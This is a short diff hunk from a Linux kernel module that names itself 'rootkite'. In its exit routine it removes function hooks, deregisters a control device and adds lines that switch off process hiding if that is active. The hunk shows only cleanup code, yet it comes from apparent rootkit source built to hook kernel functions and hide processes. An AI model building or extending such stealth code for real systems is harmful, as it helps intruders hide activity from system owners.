@@ -134,6 +134,9 @@ static void __exit mod_exit(void){
     fh_remove_hooks(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE); //cleanup the hooks and revert them
     cleanup_lists();
     misc_deregister(&controller); // deregister the device controller
+    if(hide_process_active == 1){
+        switch_hide_process();
+    }
     printk(KERN_INFO "rootkite: exit\n");
 }
 
